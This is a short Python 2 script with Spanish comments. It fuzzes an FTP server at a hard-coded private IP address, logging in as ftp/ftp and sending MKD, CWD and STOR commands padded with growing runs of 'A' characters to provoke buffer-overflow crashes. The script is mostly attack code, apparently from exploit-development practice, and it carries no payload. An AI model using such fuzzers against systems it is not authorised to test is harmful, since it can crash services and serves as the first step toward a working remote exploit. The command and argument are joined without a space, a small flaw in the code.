#!/usr/bin/python2
import socket

buffer=["A"]
contador=10
while len(buffer)<=30:
	buffer.append ("A"*contador)
	contador=contador+100

comandos = ["MKD","CWD","STOR"]

for comando in comandos:
	for cadena in buffer:
		print ("Ejecuto el comando " + comando + " con una cadena de: " + str(len(cadena)) + " bytes")
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		conexion = s.connect(('192.168.63.148',21))
		s.recv(1024)
		s.send('USER ftp\r\n') # USUARIO
		s.recv(1024)
		s.send('PASS ftp\r\n') #PASS
		s.recv(1024)
		s.send(comando + '' + cadena + '\r\n')
		s.recv(1024)
		s.send ('QUIT\r\n')
		s.close()

